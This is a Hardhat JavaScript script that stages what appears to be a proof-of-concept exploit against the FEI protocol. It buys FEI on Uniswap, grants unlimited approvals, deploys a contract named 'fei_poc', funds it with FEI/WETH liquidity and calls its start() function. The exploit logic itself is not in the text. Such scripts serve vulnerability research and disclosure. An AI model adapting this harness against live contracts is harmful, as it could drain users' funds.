const { ethers } = require("hardhat");

async function main() {
    // Hardhat always runs the compile task when running scripts with its command
    // line interface.
    //
    // If this script is run directly using `node` you may want to call compile
    // manually to make sure everything is compiled
    // await hre.run('compile');
  
    const [signer] = await ethers.getSigners();
    console.log("signer address is: ",signer.address, "the balance of ETH is: ", await signer.getBalance());
    console.log("the block number is :", await ethers.provider.getBlockNumber());
  
  
    const FEI = "0x956F47F50A910163D8BF957Cf5846D573E7f87CA";
    const UNI_Router = "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D";
    const WETH = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2";
    const FEI_WETH = "0x94B0A3d511b6EcDb17eBF877278Ab030acb0A878";
  
  
    const erc20_abi = ["function balanceOf(address account) external view returns (uint256)", "function approve(address spender, uint256 amount) external returns (bool)", "function transferFrom(address from, address to, uint256 amount) external returns (bool)"];
    const router_abi = ["function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) external payable returns (uint[] memory amounts)", "function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity)"];
    const uni_pair_abi = ["function getReserves() public view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast)"];

    const FEI_token = new ethers.Contract(FEI, erc20_abi, signer);
    const WETH_token = new ethers.Contract(WETH, erc20_abi, signer);
    const FEI_WETH_token = new ethers.Contract(FEI_WETH, erc20_abi, signer);
    const FEI_WETH_pair = new ethers.Contract(FEI_WETH, uni_pair_abi, signer);
    const Router = new ethers.Contract(UNI_Router, router_abi, signer);

    await Router.swapExactETHForTokens(0, [WETH, FEI], signer.address, Date.now(), {value : ethers.utils.parseEther('0.1')});
    var fei_balance = await FEI_token.balanceOf(signer.address);
    console.log("I have got FEI: ", fei_balance);

    // console.log("FEI_WETH_pair reserve", await FEI_WETH_pair.getReserves());
    await FEI_token.approve(UNI_Router, BigInt(99999999999999999999999999999));
    await WETH_token.approve(UNI_Router, BigInt(99999999999999999999999999999));
    


    /////////////////////////////////////////////////////////////////////////
    const FEI_protocol = await ethers.getContractFactory("fei_poc");
    const FEI_test = await FEI_protocol.deploy();
    await FEI_test.deployed();
    console.log("FEI_test deployed to:", FEI_test.address);

    await Router.addLiquidityETH(FEI, BigInt(217190525088728031745), 0, 0, FEI_test.address, Date.now(), {value : ethers.utils.parseEther('0.15')});

    var lp_token = await FEI_WETH_token.balanceOf(FEI_test.address);
    console.log("FEI_test has got lp token: ", lp_token);
    
    await FEI_test.set_approve();
    await FEI_test.start();
}
  
  // We recommend this pattern to be able to use async/await everywhere
  // and properly handle errors.
  main()
    .then(() => process.exit(0))
    .catch((error) => {
      console.error(error);
      process.exit(1);
    });